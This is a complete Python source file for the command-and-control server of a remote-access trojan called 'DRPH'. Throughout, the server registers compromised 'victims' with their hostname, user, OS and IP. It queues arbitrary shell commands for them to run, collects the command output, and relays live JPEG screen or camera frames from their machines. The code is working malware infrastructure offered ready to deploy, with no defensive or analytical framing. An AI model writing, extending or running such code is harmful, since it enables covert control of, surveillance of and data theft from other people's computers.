# language: python, file: server.py, target: py3.8+, render-ready
import os, sys, json, secrets, time, threading, argparse, logging
import http.server, urllib.parse

logging.basicConfig(stream=sys.stdout, level=logging.INFO,
                    format="%(asctime)s %(levelname)s %(message)s", force=True)
LOG = logging.getLogger("drph")

VERSION = "6.5"
TOKEN = "drph"
ADMIN = "drph"

VICTIMS = {}
QUEUES  = {}
RESULTS = {}
CONDITIONS = {}
STREAMS = {}  # vid -> (jpeg bytes, timestamp)
LOCK = threading.Lock()

def _json(h, obj, code=200):
    body = json.dumps(obj).encode()
    h.send_response(code)
    h.send_header("Content-Type", "application/json")
    h.send_header("Content-Length", str(len(body)))
    h.send_header("Access-Control-Allow-Origin", "*")
    h.end_headers()
    try: h.wfile.write(body)
    except Exception: pass

class H(http.server.BaseHTTPRequestHandler):
    def log_message(self, *a): pass

    def _body(self):
        n = int(self.headers.get("Content-Length", "0") or "0")
        try: return json.loads(self.rfile.read(n).decode() or "{}")
        except Exception: return {}

    def _is_admin(self): return self.headers.get("X-DRPH-Admin", "") == ADMIN
    def _is_victim(self): return self.headers.get("X-DRPH-Token", "") == TOKEN

    def do_GET(self):
        p = self.path.split("?",1)[0]
        qs = self.path.split("?",1)[1] if "?" in self.path else ""
        q = dict(urllib.parse.parse_qsl(qs))

        if p == "/":     return _json(self, {"ok": True, "v": VERSION, "name": "drph"})
        if p == "/ping": return _json(self, {"ok": True, "v": VERSION})

        if not self._is_admin():
            return _json(self, {"err":"auth"}, 403)

        if p == "/admin/victims":
            now = time.time()
            with LOCK:
                rows = [{**v, "vid": vid,
                         "age": round(now - v.get("last_seen", now), 1),
                         "queued": len(QUEUES.get(vid, [])),
                         "results": len(RESULTS.get(vid, []))}
                        for vid, v in VICTIMS.items()]
            return _json(self, {"ok": True, "victims": rows})

        if p == "/admin/results":
            vid = q.get("vid")
            if not vid: return _json(self, {"err":"vid"}, 400)
            drain = q.get("drain", "1") == "1"
            with LOCK:
                r = RESULTS.get(vid, [])
                if drain: RESULTS[vid] = []
            return _json(self, {"ok": True, "results": r})

        if p == "/admin/result_by_id":
            vid = q.get("vid"); rid = q.get("id")
            if not vid or not rid: return _json(self, {"err":"vid+id"}, 400)
            deadline = time.time() + float(q.get("timeout","30"))
            while time.time() < deadline:
                with LOCK:
                    for r in RESULTS.get(vid, []):
                        if r.get("id") == rid:
                            RESULTS[vid] = [x for x in RESULTS[vid] if x.get("id") != rid]
                            return _json(self, {"ok": True, "result": r})
                time.sleep(0.1)
            return _json(self, {"ok": False, "err":"timeout"}, 504)

        if p == "/stream_pull":
            vid = q.get("vid")
            if not vid: return _json(self, {"err":"vid"}, 400)
            now = time.time()
            with LOCK:
                item = STREAMS.get(vid)
            
            if item:
                data, ts = item
                # If frame is older than 5 seconds, don't serve it (stale)
                if now - ts <= 5.0:
                    self.send_response(200)
                    self.send_header("Content-Type", "image/jpeg")
                    self.send_header("Content-Length", str(len(data)))
                    self.send_header("Access-Control-Allow-Origin", "*")
                    self.end_headers()
                    try: self.wfile.write(data)
                    except Exception: pass
                    return
            
            self.send_response(204)
            self.end_headers()
            return

        return _json(self, {"err":"not found"}, 404)

    def do_POST(self):
        p = self.path.split("?",1)[0]

        if p == "/announce":
            if not self._is_victim(): return _json(self, {"err":"auth"}, 403)
            b = self._body(); vid = b.get("vid") or "?"
            with LOCK:
                VICTIMS[vid] = {k: b.get(k) for k in
                    ("hostname","user","os","machine","python","cwd","port","url")}
                VICTIMS[vid]["last_seen"] = time.time()
                VICTIMS[vid]["ip"] = self.client_address[0]
            LOG.info(f"announce {vid} @ {self.client_address[0]}")
            return _json(self, {"ok": True, "vid": vid})

        if p == "/beacon":
            if not self._is_victim(): return _json(self, {"err":"auth"}, 403)
            b = self._body(); vid = b.get("vid") or "?"
            
            with LOCK:
                if vid not in CONDITIONS:
                    CONDITIONS[vid] = threading.Condition(LOCK)
            
            cond = CONDITIONS[vid]
            deadline = time.time() + 20
            
            with cond:
                v = VICTIMS.setdefault(vid, {})
                for k in ("hostname","user","os","machine","python","cwd","port","url"):
                    if b.get(k) is not None: v[k] = b[k]
                v["last_seen"] = time.time()
                v.setdefault("ip", self.client_address[0])
                q = QUEUES.setdefault(vid, [])
                
                while not q and time.time() < deadline:
                    cond.wait(timeout=1.0)
                    
                if q:
                    item = q.pop(0)
                    return _json(self, {"op":"cmd", "id":item["id"], "cmd":item["cmd"]})
            return _json(self, {"op":"wait", "sec": 1})

        if p == "/result":
            if not self._is_victim(): return _json(self, {"err":"auth"}, 403)
            b = self._body(); vid = b.get("vid") or "?"
            with LOCK:
                RESULTS.setdefault(vid, []).append({
                    "id": b.get("id"), "cmd": b.get("cmd",""),
                    "out": b.get("out",""), "cwd": b.get("cwd",""), "ts": time.time()})
                VICTIMS.setdefault(vid, {})["last_seen"] = time.time()
            return _json(self, {"ok": True})

        if p == "/admin/queue":
            if not self._is_admin(): return _json(self, {"err":"auth"}, 403)
            b = self._body(); vid, cmd = b.get("vid"), b.get("cmd")
            if not vid or not cmd: return _json(self, {"err":"vid+cmd"}, 400)
            cid = secrets.token_hex(6)
            with LOCK:
                QUEUES.setdefault(vid, []).append({"id": cid, "cmd": cmd})
                if vid in CONDITIONS:
                    CONDITIONS[vid].notify_all()
            return _json(self, {"ok": True, "id": cid})

        if p == "/stream_push":
            if not self._is_victim(): return _json(self, {"err":"auth"}, 403)
            vid = self.headers.get("X-DRPH-Vid", "?")
            n = int(self.headers.get("Content-Length", "0"))
            data = self.rfile.read(n)
            with LOCK: 
                STREAMS[vid] = (data, time.time())
            return _json(self, {"ok": True})

        return _json(self, {"err":"not found"}, 404)

def serve(host, port):
    srv = http.server.ThreadingHTTPServer((host, port), H)
    srv.daemon_threads = True
    LOG.info("=" * 60)
    LOG.info(f"DRPH relay v{VERSION}  {host}:{port}")
    LOG.info(f"VICTIM TOKEN : {TOKEN}")
    LOG.info(f"ADMIN  TOKEN : {ADMIN}")
    LOG.info("=" * 60)
    sys.stdout.flush()
    try: srv.serve_forever()
    except KeyboardInterrupt: pass

if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="0.0.0.0")
    ap.add_argument("--port", type=int, default=None)
    a = ap.parse_args()
    port = a.port or int(os.environ.get("PORT", "8443"))
    serve(a.host, port)
